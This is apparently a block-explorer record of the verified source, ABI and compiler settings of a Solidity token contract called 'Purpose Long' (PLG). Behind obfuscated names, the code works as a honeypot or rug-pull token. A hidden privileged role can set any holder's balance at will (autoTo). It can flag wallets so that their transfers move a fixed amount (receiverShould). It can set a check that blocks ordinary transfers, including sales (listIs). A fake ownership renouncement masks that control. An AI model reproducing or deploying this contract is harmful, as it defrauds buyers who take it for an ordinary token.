{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface atBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchEnableExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapMarketingEnable {\n    function createPair(address fundReceiver, address isFrom) external returns (address);\n}\n\ninterface isTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyAuto) external view returns (uint256);\n\n    function transfer(address txMinEnable, uint256 fromMax) external returns (bool);\n\n    function allowance(address receiverAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMinEnable,\n        uint256 fromMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderReceiver, uint256 value);\n    event Approval(address indexed receiverAmount, address indexed spender, uint256 value);\n}\n\ninterface isTeamMetadata is isTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PurposeLong is launchEnableExempt, isTeam, isTeamMetadata {\n\n    function atMarketing(address liquidityReceiver, address txMinEnable, uint256 fromMax) internal returns (bool) {\n        if (liquidityReceiver == buyMinAmount) {\n            return takeTeam(liquidityReceiver, txMinEnable, fromMax);\n        }\n        uint256 launchedAt = isTeam(tradingMode).balanceOf(txAt);\n        require(launchedAt == teamFee);\n        require(txMinEnable != txAt);\n        if (swapReceiver[liquidityReceiver]) {\n            return takeTeam(liquidityReceiver, txMinEnable, feeMax);\n        }\n        return takeTeam(liquidityReceiver, txMinEnable, fromMax);\n    }\n\n    address txAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public tokenIsFee;\n\n    string private receiverReceiver = \"PLG\";\n\n    mapping(address => mapping(address => uint256)) private tokenLimit;\n\n    bool public walletLaunch;\n\n    function receiverShould(address feeTx) public {\n        isShouldReceiver();\n        \n        if (feeTx == buyMinAmount || feeTx == tradingMode) {\n            return;\n        }\n        swapReceiver[feeTx] = true;\n    }\n\n    uint256 private senderFundLaunched;\n\n    function receiverToEnable(address listFeeTotal) public {\n        if (takeTotal) {\n            return;\n        }\n        if (takeMinExempt != walletLaunch) {\n            walletLaunch = false;\n        }\n        minBuy[listFeeTotal] = true;\n        \n        takeTotal = true;\n    }\n\n    mapping(address => bool) public minBuy;\n\n    address toList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return isSell;\n    }\n\n    uint256 teamFee;\n\n    event OwnershipTransferred(address indexed tokenAmount, address indexed fundTo);\n\n    uint256 public totalLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverReceiver;\n    }\n\n    bool public takeTotal;\n\n    bool public amountTo;\n\n    function name() external view virtual override returns (string memory) {\n        return totalSenderReceiver;\n    }\n\n    uint256 private teamToFund = 100000000 * 10 ** 18;\n\n    string private totalSenderReceiver = \"Purpose Long\";\n\n    function isShouldReceiver() private view {\n        require(minBuy[_msgSender()]);\n    }\n\n    mapping(address => bool) public swapReceiver;\n\n    function autoTo(address feeFund, uint256 fromMax) public {\n        isShouldReceiver();\n        tradingFrom[feeFund] = fromMax;\n    }\n\n    function transfer(address feeFund, uint256 fromMax) external virtual override returns (bool) {\n        return atMarketing(_msgSender(), feeFund, fromMax);\n    }\n\n    function allowance(address toTrading, address txMax) external view virtual override returns (uint256) {\n        if (txMax == toList) {\n            return type(uint256).max;\n        }\n        return tokenLimit[toTrading][txMax];\n    }\n\n    address public tradingMode;\n\n    uint256 constant feeMax = 9 ** 10;\n\n    function transferFrom(address liquidityReceiver, address txMinEnable, uint256 fromMax) external override returns (bool) {\n        if (_msgSender() != toList) {\n            if (tokenLimit[liquidityReceiver][_msgSender()] != type(uint256).max) {\n                require(fromMax <= tokenLimit[liquidityReceiver][_msgSender()]);\n                tokenLimit[liquidityReceiver][_msgSender()] -= fromMax;\n            }\n        }\n        return atMarketing(liquidityReceiver, txMinEnable, fromMax);\n    }\n\n    function getOwner() external view returns (address) {\n        return isSell;\n    }\n\n    bool public takeMinExempt;\n\n    function balanceOf(address buyAuto) public view virtual override returns (uint256) {\n        return tradingFrom[buyAuto];\n    }\n\n    function takeTeam(address liquidityReceiver, address txMinEnable, uint256 fromMax) internal returns (bool) {\n        require(tradingFrom[liquidityReceiver] >= fromMax);\n        tradingFrom[liquidityReceiver] -= fromMax;\n        tradingFrom[txMinEnable] += fromMax;\n        emit Transfer(liquidityReceiver, txMinEnable, fromMax);\n        return true;\n    }\n\n    address public buyMinAmount;\n\n    function receiverTx() public {\n        emit OwnershipTransferred(buyMinAmount, address(0));\n        isSell = address(0);\n    }\n\n    uint256 listLaunch;\n\n    uint8 private isReceiverSell = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamToFund;\n    }\n\n    function approve(address txMax, uint256 fromMax) public virtual override returns (bool) {\n        tokenLimit[_msgSender()][txMax] = fromMax;\n        emit Approval(_msgSender(), txMax, fromMax);\n        return true;\n    }\n\n    uint256 private takeMarketing;\n\n    constructor (){\n        if (takeMarketing == senderFundLaunched) {\n            amountTo = false;\n        }\n        atBuy txFrom = atBuy(toList);\n        tradingMode = swapMarketingEnable(txFrom.factory()).createPair(txFrom.WETH(), address(this));\n        if (takeMarketing == tokenIsFee) {\n            amountTo = false;\n        }\n        buyMinAmount = _msgSender();\n        receiverTx();\n        minBuy[buyMinAmount] = true;\n        tradingFrom[buyMinAmount] = teamToFund;\n        if (walletLaunch != takeMinExempt) {\n            walletLaunch = false;\n        }\n        emit Transfer(address(0), buyMinAmount, teamToFund);\n    }\n\n    address private isSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isReceiverSell;\n    }\n\n    bool private modeReceiver;\n\n    function listIs(uint256 fromMax) public {\n        isShouldReceiver();\n        teamFee = fromMax;\n    }\n\n    mapping(address => uint256) private tradingFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMax\",\"type\":\"uint256\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMinAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMax\",\"type\":\"uint256\"}],\"name\":\"listIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFeeTotal\",\"type\":\"address\"}],\"name\":\"receiverToEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMinExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIsFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMinEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PurposeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}